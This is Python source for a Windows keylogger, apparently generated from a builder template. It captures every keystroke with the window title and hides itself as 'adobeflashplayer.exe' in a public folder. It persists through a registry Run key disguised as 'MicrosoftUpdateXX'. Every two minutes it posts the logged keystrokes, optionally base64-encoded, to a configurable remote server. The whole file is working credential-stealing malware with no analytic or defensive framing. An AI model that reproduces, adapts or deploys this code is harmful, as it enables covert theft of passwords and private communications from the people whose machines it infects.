import pythoncom
import pyHook
from os import path
from time import sleep
from threading import Thread
import urllib, urllib2
import datetime
import win32com.client
import win32event, win32api, winerror
from _winreg import *
import shutil
import sys
import base64
import requests

ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    print "nope"
    sys.exit()

x, data, count= '', '', 0

dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
lastWindow = ''

def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
if not path.isfile(dir):
    startup()   

    
def send_http_post():
    global data
    while True:
        if len(data) > 30:
            try:

				timeInSecs = datetime.datetime.now()
				#SERVER_URL = The server URL to post to
				#POST_DATA = The post data to include. 
				# Use $KeyStream$ for the area of the keystream
				# Use $Date$ for the sending date         
				#BASE64_ENC - if to encode as base64   
				keysData = data
				if BASE64_ENC == 'y':
					keysData = base64.encodestring(keysData)
				postData = POST_DATA
				postData = postData.replace('$KeyStream$', keysData)
				postData = postData.replace('$Date$', str(timeInSecs) )
				
				requests.post(SERVER_URL, data=postData)
            except Exception as error:
                print error
        sleep(120)


def pushing(event):
    global data, lastWindow
    window = event.WindowName
    keys = {
            13: ' [ENTER] ',
            8: ' [BACKSPACE] ',
            162: ' [CTRL] ',
            163: ' [CTRL] ',
            164: ' [ALT] ',
            165: ' [ALT] ',
            160: ' [SHIFT] ',
            161: ' [SHIFT] ',
            46: ' [DELETE] ',
            32: ' [SPACE] ',
            27: ' [ESC] ',
            9: ' [TAB] ',
            20: ' [CAPSLOCK] ',
            38: ' [UP] ',
            40: ' [DOWN] ',
            37: ' [LEFT] ',
            39: ' [RIGHT] ',
            91: ' [SUPER] '
            }
    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
    if window != lastWindow:
        lastWindow = window
        data += ' { ' + lastWindow + ' } '
        data += keyboardKeyName 
    else:
        data += keyboardKeyName

if __name__ == '__main__':
    triggerThread = Thread(target=send_http_post)
    triggerThread.start()

    hookManager = pyHook.HookManager()
    hookManager.KeyDown = pushing
    hookManager.HookKeyboard()
    pythoncom.PumpMessages()
